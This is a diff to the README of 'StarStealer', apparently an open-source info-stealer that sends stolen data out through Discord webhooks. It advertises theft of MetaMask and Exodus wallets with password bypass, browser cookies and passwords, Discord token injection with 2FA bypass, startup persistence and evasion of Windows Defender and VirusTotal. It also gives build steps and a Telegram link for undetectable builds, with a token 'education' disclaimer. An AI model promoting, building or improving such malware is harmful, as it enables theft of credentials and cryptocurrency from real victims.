@@ -1,2 +1,82 @@
-# StarStealer
-StarStealer is a FUD and Open Source Discord Webhook Based Stealer that can retrieve a victim's Wallets (Exodus, MetaMask), Passwords, Cookies, Telegram Sessions, and more. It can even bypass wallet passwords/PIN codes.
+<a id="top"></a>
+<h1 align="center">
+ Star  ☆ Stealer                                                  
+    <br>      FUD (Bypass AV) on Tele
+    <br>      https://t.me/+LqkYlIt6Rsw2MDAx
+</h1>
+<br>
+<p align="center"> 
+  <kbd>
+<img src="https://i.pinimg.com/originals/f3/76/4d/f3764d224222bb809ee9c58eb7a93465.gif" width="328"></img>
+  </kbd>
+</p>
+
+<h1 align="center">
+    ☆ 33 Stars = FUD METHOD
+</h1>
+
+<p align="center">
+<img src="https://img.shields.io/github/last-commit/doenerium6969/doenerium-fixed?style=flat">
+<img src="https://img.shields.io/github/stars/doenerium6969/doenerium-fixed?color=brightgreen">
+<img src="https://img.shields.io/github/forks/doenerium6969/doenerium-fixed?color=brightgreen">
+</p>
+<br>
+
+## 🌐 〢 Content
+
+- [✮⋆˙  Setting Up](#setup)
+- [⋆⭒˚.⋆ Features](#features)
+
+<a id="setup"></a>
+
+---
+
+### ✮⋆˙ Setting Up
+
+1. Install Python 3.10 [Or just run InstallPython.bat]
+2. Run BuildStar.bat
+3. Enjoy your working StarStealer
+
+---
+<a id="features"></a>
+### ⋆⭒˚.⋆ Features
+
+#### StarStealer
+
++ MetaMask Extension Saver & Password Bypass (70% working rate)
+
++ Exodus Saver + Password Bypass
+
++ All Cookies & Passwords for all Chromium-based Browsers (Chrome, Edge, Opera, Brave, etc.)
+
++ Discord Injection (2FA Bypass)
+
++ Persistent file (Run on startup)
+
++ Editable webhook (Change the webhook if it gets deleted)
+
++ Bypass Windows Defender Screen
+
++ Bypass VirusTotal
+
+
+
+#### Extra
+
+soon
+
+---
+
+### screenshots
+
+soon
+
+
+<a id="todo"></a>
+
+---
+By downloading this, you agree to the Commons Clause license and that you're not allowed to sell this repository or any code from this repository. For more info see [commonsclause](https://commonsclause.com/)
+---
+
+### blink blink
+I am not responsible for any damages this software may cause after being acquired. This software was made for personal education and sandbox testing.
